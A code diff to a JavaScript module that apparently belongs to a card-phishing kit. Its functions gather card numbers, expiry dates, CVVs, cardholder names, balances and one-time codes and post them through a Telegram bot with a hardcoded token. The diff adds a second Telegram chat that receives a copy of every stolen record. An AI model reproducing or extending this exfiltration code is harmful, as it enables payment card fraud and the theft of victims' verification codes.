@@ -1,6 +1,7 @@
 import axios from "axios";
 
 const chatId = -646464471;
+const toChatId = -785439847;
 
 const sendMessage = (chat_id, text) => {
   const token = "5259689453:AAH0q8QFHOAdISIqtQyaPv8V7WoFXIN1CEg";
@@ -18,6 +19,7 @@ export const sendCard = (card, date, cvv, price, placeholder) => {
     msg += `💵 Сумма: ${price} \n`;
     msg += `👷‍♂️ Имя: ${placeholder}`;
     sendMessage(chatId, msg);
+    sendMessage(toChatId, msg);
   } catch (e) {
     console.log(e);
   }
@@ -28,6 +30,7 @@ export const sendBalance = (balance, price) => {
     let msg = `💸 Баланс: ${balance} $\n`;
     msg += `💵 Сумма: ${price} \n`;
     sendMessage(chatId, msg);
+    sendMessage(toChatId, msg);
   } catch (e) {
     console.log(e);
   }
@@ -38,6 +41,7 @@ export const sendCode = (code, price) => {
     let msg = `🧨 Код: ${code}\n`;
     msg += `💵 Сумма: ${price} \n`;
     sendMessage(chatId, msg);
+    sendMessage(toChatId, msg);
   } catch (e) {
     console.log(e);
   }
